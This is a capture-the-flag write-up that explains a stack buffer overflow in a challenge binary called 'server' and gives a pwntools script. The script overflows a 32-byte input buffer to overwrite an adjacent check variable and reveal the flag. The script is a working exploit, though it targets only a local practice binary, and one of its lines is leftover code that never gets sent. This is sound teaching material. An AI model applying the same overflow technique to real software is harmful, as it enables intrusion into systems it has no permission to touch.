# Buffer Overflow Exploit for `server`

## Overview
This challenge presents a classic **buffer overflow vulnerability** where the goal is to overwrite a variable (`s1`) to bypass a security check and print the flag.

## Analysis
Decompiling the binary reveals the following key points:
- The variable `s` (32 bytes) is located at `rbp-50h`.
- The variable `s1` (8 bytes) is located immediately after `s` at `rbp-30h`.
- The program uses `fgets(s, 64, stdin);` to take input, allowing **more than 32 bytes** to be written.
- The check `strncmp(s1, "low", 3uLL)` determines whether the flag is printed.
- If `s1` is anything other than `"low"`, the program enters the second condition and prints the flag.

## Exploitation Strategy
Since `s1` is directly after `s`, we can **overflow `s` and modify `s1`** by providing more than 32 bytes of input. The simplest approach is:
1. **Send 32 bytes of filler (`'A' * 32`)** to fill `s`.
2. **Overwrite `s1` with arbitrary data** (e.g., `"When Stamford Raffles held the torch"`).
3. **Trigger the flag print** when `s1` is no longer `"low"`.

## Exploit Code

```python
from pwn import *

# Set up the local process
r = process("./server")  # Running the local binary

# Receive the initial prompt
print(r.recvuntil(b'>').decode())

# Prepare the payload
payload = b'A' * 32 + b'When Stamford Raffles held the torch'  # Fill the buffer and overwrite s1

# Send the payload
r.sendline(payload)
print(r.recv().decode())

# Additional interaction (if needed)
payload += b"And cast Promethean Flame"  # Extra input (not necessary but for demonstration)
print(r.recv().decode())

# Interact with the shell (if needed)
r.interactive()
